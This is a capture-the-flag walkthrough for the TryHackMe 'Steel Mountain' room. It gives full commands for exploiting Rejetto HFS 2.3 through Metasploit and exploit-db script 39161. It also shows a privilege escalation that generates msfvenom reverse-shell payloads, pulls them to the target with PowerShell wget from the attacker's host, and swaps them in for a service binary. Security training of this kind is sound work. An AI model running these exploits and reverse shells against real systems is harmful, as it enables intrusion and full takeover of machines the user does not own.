| [![Steel Mountain](/_static/images/steel-mountain.png)](https://tryhackme.com/room/steelmountain) |
|:--:|
| [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain) |

# Steel Mountain

Use Metasploit for initial access, Powershell for Windows privilege escalation enumeration, and gain 
Administrator access.

## Exploring

Looking in web developer tools that employee of the months name is Bill Harper. Not much more to find.

## Scanning

```text
# nmap -sV -sC -oN nmap.out -p- <IP address target> -vv
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 12:08 BST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
...
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
|_ssl-date: 2022-09-27T11:14:36+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-09-27T11:14:30+00:00
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-09-26T10:48:42
| Not valid after:  2023-03-28T10:48:42
| MD5:   de63 ecf7 7e35 7106 8f5c 1c09 8bbd b962
| SHA-1: 5fed 6ce6 c851 ced0 7438 3d16 79b1 0c4a ba24 9eb4
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQUqJCfCl2laFPtSD8fRzcnTANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIyMDkyNjEwNDg0MloXDTIzMDMy
| ODEwNDg0MlowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAMSQ6HyI9K8HNV1A7y8umYrrUQ4+SIPPI1GWRLDG
| nPTfflFnzQnpp80SAAEeALwv8jqHdmNS+Seb3og8HkobdelA04RqbIn1hL1ndVC2
| TSJe7APAHeDsUKZ67Oc9gJaz/H1WUSKKj6OwJtzPV6ztXpgQ7Md4y2k4C0Bt38NJ
| 17sCIgVujSwIv6P+/Zvrqse4hH9ByuKf8SAIRcA0+TymHjCo/2UFv6GYetvfhgha
| 558VxK6pF1utC3FIBfGv09g3h/OCw0dzXU0b+DVaGYurdJbn2IwmAEbzpq7y3eXr
| 5/r/D87h+yuHREXZTH+pE389SrShxwmhIhu27KyyaCmGko8CAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQAJF4GL6/L/eeEj112WEUQbf94qZk3aB60b47aHMayns+/+gA8+7SvTlt+pUhJ/
| Bmy0EJbfI1LnxDTKXVHLX/dMErsEke/9M40LYXaDsDj+84J2TChvFpKAV6tidDBV
| Gl4gZXfkE5WuPpTM3Tuz9AopUPxf5ljEIQ0Fw7SZlTTl0+1dbRV7WPBnaB2IP/AF
| UFa6QRro1SOV+rnbOEH1zerqMVfijuOcJ0+42D+3iN/+M7bdN8oQV0fzYUGqBvdi
| ivoioB4At/x/10RM5pE3IAHoEoAHTy57BKwjdFcBwpKx4KZEJchkn7/fDeaxr/DS
| brcpY8CvUwNziw9oREDY1I8d
|_-----END CERTIFICATE-----
5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:bc:49:69:fa:bd (unknown)
| Names:
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   STEELMOUNTAIN<20>    Flags: <unique><active>
| Statistics:
|   02 bc 49 69 fa bd 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-09-27T11:14:30
|_  start_date: 2022-09-27T10:48:34
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11598/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59624/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43955/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23853/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Nmap done: 1 IP address (1 host up) scanned in 348.88 seconds
           Raw packets sent: 66982 (2.947MB) | Rcvd: 66685 (2.667MB)
```

A website running on port 80, RPC, SMB using port 139 and 445) and some HTTP related services on 5985, 8080 and 47001. 
There is also a SSL service running on port 3389, which encrypts RDP sessions.

The http server on port 8080 is running HFS 2.3.

## Gaining a foothold

```text
─# searchsploit http file server -w
------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                           |  URL
------------------------------------------------------------------------- --------------------------------------------
...
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)      | https://www.exploit-db.com/exploits/34668
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)      | https://www.exploit-db.com/exploits/39161
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | https://www.exploit-db.com/exploits/34852
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)              | https://www.exploit-db.com/exploits/49125
...
------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
Papers: No Results
```

There are several exploits possible for version 2.3.x. 
[Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) gives the CVE.

```text
# msfconsole
[*] Starting persistent handler(s)...
msf6 > search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

Use the one given exploit and set its options:

```text
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS <IP address target>
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST IP <IP address attack machine>
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on <IP address attack machine>:4444 
...
[*] Meterpreter session 1 opened (<IP address attack machine>:4444 -> <IP address target machine>:49186) at 2022-09-28 00:57:13 +0100
[*] Server stopped.

meterpreter > 
```

Okay, got meterpreter. Find the flag (`search -f *.txt`) and continue. 

## Privilege escalation with metasploit

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is a script that can be 
used to enumerate a Windows machine.

```text
meterpreter > upload /home/<kaliuser>/Downloads/PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

A looong list. 

```text
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
```

`AdvancedSystemCareService9` has an unquoted service path vulnerability, the directory to the application is 
writeable, AND it has the `CanRestart` option `True`. The legitimate application can be replaced with another one.

Create payload on the attack machine:

```text
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
...
Saved as: Advanced.exe
```

Upload payload to target machine:

```text
meterpreter > upload /home/<kaliuser>/Downloads/Advanced.exe
```

Start a listener on the attack machine:

    # nc -lvnp 4443

Switch to a shell, stop service, replace executable, and start service:

```text
meterpreter > shell
C:\Users\bill\AppData\Local\Temp>sc stop AdvancedSystemCareService9
C:\Users\bill\AppData\Local\Temp>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): Yes
C:\Users\bill\AppData\Local\Temp>sc start AdvancedSystemCareService9
```

And when the connection is made, get the root flag:

    C:\Users\Administrator\Desktop>type root.txt
    type root.txt

## Initial access without metasploit

[Download the exploit](https://www.exploit-db.com/raw/39161) by copying the raw text and rename it into something like
`39161.py`. Edit the script: Set the local IP address and Port to those of the attack machine. The script 
is a python2 script. It will not work with python3 without editing.

The payload script uses port 80 for the file web server by default. If the 80 port is in use by another service, 
add `+":8000"+` after the `ip_addr` variable in that long `vbs` parameter. 

On Kali, in `~/Downloads`, copy the netcat binary from `/usr/share/windows-binaries/nc.exe` 

    # cp /usr/share/windows-binaries/nc.exe .

If not on Kali, [Download the netcat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) and 
rename it to `nc.exe` to work with the exploit script.

On the attack machine, in a second terminal in the directory with the exploit (`~/Downloads`), start a Python web 
server: 

    # python3 -m http.server 80

Start a netcat listener on the attack machine in a third terminal:

    # nc -lvnp 443

There are now 3 terminal tabs open: One running the exploit, one running the python http server, and one running 
the netcat listener.

Run the exploit in the first terminal. The script has to be run twice for it to work. The first time will pull the 
netcat binary to the target and the second time will execute the payload to gain a callback within the listener:

    # python2 39161.py <IP address target machine> 8080
    # python2 39161.py <IP address target machine> 8080

## Escalation without metasploit

[Download a WINPEAS binary](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and put it in 
`~/Downloads` where the `http.server` is running.

Get it in the shell from the server:

    cd C:\Users\Bill\Desktop
    powershell -c wget "http://<IP address attack machine>/winPEAS.exe" -outfile "winPEAS.exe"

Execute winPEAS:

    winPEAS.exe

It has found some unquoted service paths. Just like PowerUp did.

Create a payload with `msfvenom` in the `~/Downloads` directory:

    msfvenom -p windows/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe

Pull to the system via PowerShell:

    powershell -c wget "http://<IP address attack machine>/ASCService.exe" -outfile "ASCService.exe"

Open a fourth terminal, with another listener:

    nc -lvnp 4443

Stop, replace executable and start the service:

    sc stop AdvancedSystemCareService9
    copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
    sc start AdvancedSystemCareService9

And when the connection is made, get the root flag:

    C:\Users\Administrator\Desktop>type root.txt
    type root.txt